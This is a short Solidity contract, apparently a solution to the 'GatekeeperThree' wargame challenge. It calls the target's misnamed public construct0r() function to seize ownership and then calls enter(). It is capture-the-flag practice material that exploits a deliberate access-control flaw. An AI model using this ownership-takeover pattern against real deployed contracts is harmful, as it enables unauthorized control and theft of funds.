pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function construct0r() external;
    function enter() external;
}

contract OwnerContract {
    IGatekeeperThree public immutable target;

    constructor(address _target) {
        target = IGatekeeperThree(_target);
    }

    function setOwner() external {
        target.construct0r();
    }

    function callEnter() external {
        target.enter();
    }
}